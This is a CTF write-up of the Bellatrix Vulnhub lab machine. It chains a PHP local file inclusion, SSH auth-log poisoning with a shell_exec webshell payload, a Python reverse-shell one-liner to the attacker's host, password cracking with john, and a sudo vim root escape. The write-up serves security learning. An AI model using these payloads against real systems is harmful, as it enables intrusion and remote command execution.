---
layout: post
title:  Bellatrix Vulnhub Writeup
category: ctfs
tags: [vulnhub, php, ctf]
published: true
author: j1v37u2k3y
show_sidebar: true
toc: true
searchable: trues
---
The evil Bellatrix Lestrange has escaped from the prison of Azkaban, but as ... Find out and tell the Minister of Magic

Difficult: Medium

This works better in VirtualBox

Hints --> Brute force is not necessary, unless it is required. ncat is the key ;)

Social-Media: Twitter --> @BertrandLorent9, Instagram --> @BertrandLorente9
<!--cut-->

* TOC
{:toc}

# NMAP
<a href="{{ site.baseurl }}/assets/reports/nmap/vulnhub/bellatrix/version.html" target="_blank" title="Bellatrix NMAP Scan">Bellatrix NMAP Scan</a> 
 

## Port 80

<img src="{{ site.baseurl }}/assets/images/vulnhub/bellatrix/image2.png" style="width:9.52083in;height:8.23958in" alt="Machine generated alternative text: AvadaKedavra I Network Red Network Tools DARK ARTS ikilledsiriusblackikilledsiriusblackikilledsiriusblackikilledsiriusblack ikilledsiriusblackikilledsiriusblackikilledsiriusblackikilledsiriusblack ikilledsiriusblackikilledsiriusblackikilledsiriusblackikilledsiriusblack ikilledsiriusblackikilledsiriusblackikilledsiriusblackikilledsiriusblack ikilledsiriusblackikilledsiriusblackikilledsiriusblackikilledsiriusblack ikilledsiriusblackikilledsiriusblackikilledsiriusblackikilledsiriusblack ikilledsiriusblackikilledsiriusblackikilledsiriusblackikilledsiriusblack ikilledsiriusblackikilledsiriusblackikilledsiriusblackikilledsiriusblack ikilledsiriusblackikilledsiriusblackikilledsiriusblackikilledsiriusblack ikilledsiriusblackikilledsiriusblackikilledsiriusblackikilledsiriusblack ikilledsiriusblackikilledsiriusblackikilledsiriusblackikilledsiriusblack.php " />

## Port 80 Source

<img src="{{ site.baseurl }}/assets/images/vulnhub/bellatrix/image3.png" style="width:7.09375in;height:7.71875in" />

## Port 80 ikilledsiriusblack.php LFI

<img src="{{ site.baseurl }}/assets/images/vulnhub/bellatrix/image4.png" style="width:9.04167in;height:8.46875in" />

# SSH Log Posioning

```
┌─[root@redteam2020] ─ [Fri Dec 04 14:24:56] [~/ctfs/vulnhub/bellatrix]
└──╼ # ssh '<?php echo shell_exec($_GET["j1v37u2k3y"]);?>'@192.168.9.128
<?php echo shell_exec($_GET["j1v37u2k3y"]);?>@192.168.9.128's password: 

┌─[✗]─[root@redteam2020] ─ [Fri Dec 04 14:25:59] [~/ctfs/vulnhub/bellatrix]
└──╼ # 
```
## ikilledsiriusblack.php?file=/var/log/auth.log

<img src="{{ site.baseurl }}/assets/images/vulnhub/bellatrix/image5.png" style="width:10.375in;height:8.32292in" />

<img src="{{ site.baseurl }}/assets/images/vulnhub/bellatrix/image6.png" style="width:10.86458in;height:0.77083in" />

## Reverse Shell

```
 >>  22
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.9.129",1334));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' Copied to clipboard
┌─[root@redteam2020] ─ [Fri Dec 04 14:29:05] [~/ctfs/vulnhub/bellatrix]
└──╼ # 
```

### www-data shell

<img src="{{ site.baseurl }}/assets/images/vulnhub/bellatrix/image7.png" style="width:5.42708in;height:2.35417in" alt="" />

# Crack hash with custom wordlist and john

<img src="{{ site.baseurl }}/assets/images/vulnhub/bellatrix/image8.png" style="width:7.44792in;height:2.34375in" alt="Machine generated alternative text: Fri Dec 04 i@redtem2020 —/ctfs/vuLnhub/beLLatrix/Loots # john Swordofgryffindor - -wordlist=secret.dic Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512*/ 8x]) password hashes Left to crack (see FAQ) Fri Dec 04 14:33:35 L—/ctfs/vuLnhub/beLLatrix/Loots # cat Swordofgryffindor Lest range : $6$1e1j sdebFF9/ rsXH$Naj EfDYUP7p/sqHdy01FwNnLtiRPw1ueL14a8zyQ1dRULAomDN rnRjTPN5Y/Wi Fri Dec 04 toedteam2020 -/ctfs/vuLnhub/beLLatrix/Loots # john Swordofgryffindor - -wordlist=secret.dic - Invalid options ccnbination or duplicate option: &quot; Fri Dec 04 L—/ctfs/vuLnhub/beLLatrix/Loots # john Swordofgryffindor lest range: ihatehar rypotter I password hash cracked, e left IFri Dec 04 i@redteam2020 L—/ctfs/vuLnhub/beLLatrix/Loots " />

## Password for lestrange

```
lestrange:ihateharrypotter
```

### SSH lestrange

<img src="{{ site.baseurl }}/assets/images/vulnhub/bellatrix/image9.png" style="width:5.88542in;height:2.0625in" />

## Sudo -l 

 - (ALL : ALL) NOPASSWD: /usr/bin/vim
    - <https://gtfobins.github.io/gtfobins/vim/>
    
## So in our case 

```
sudo /usr/bin/vim -c ':!/bin/sh'
```

# ROOT
<img src="{{ site.baseurl }}/assets/images/vulnhub/bellatrix/image10.png" style="width:5.46875in;height:6.10417in" alt="Machine generated alternative text: # cd / root nov 28 drvxr-xr-x nov 28 -rw-r--r-- 28 89. -rw-r--r-- nov 28 -ruxr-xr-x -rw-r--r-- drvxr-xr-x 28 88 nov 28 root. txt total 56 -rw-r--r- # cat 7 root 28 root roo t roo t roo t roo t 3 root 3 root roo t I root roo t roo t 3 root I root root roo t roo t roo t roo t roo t root roo t root root root roo t root root 4896 4896 1252 31B6 4896 4396 4B96 4896 161 688 47 66 4896 886 nov ago nov sep nov nov nov 27 14 nov 28 89 27 27 27 16 28 11:59 . 28:19 . 11:59 2819 21 15 11. : 22 : 89 : 137 : 137 : 26 18 •43 • 44 59 . bash history . bashrc . cache . config . dbus . local . profile root. txt script. sh . selected editor snap . viminfo l/ root {ead5a85a11ba466e11fced3B8d46Ba76} # id;hostname;date bellatrix vie 84 dic 2828 CET " />

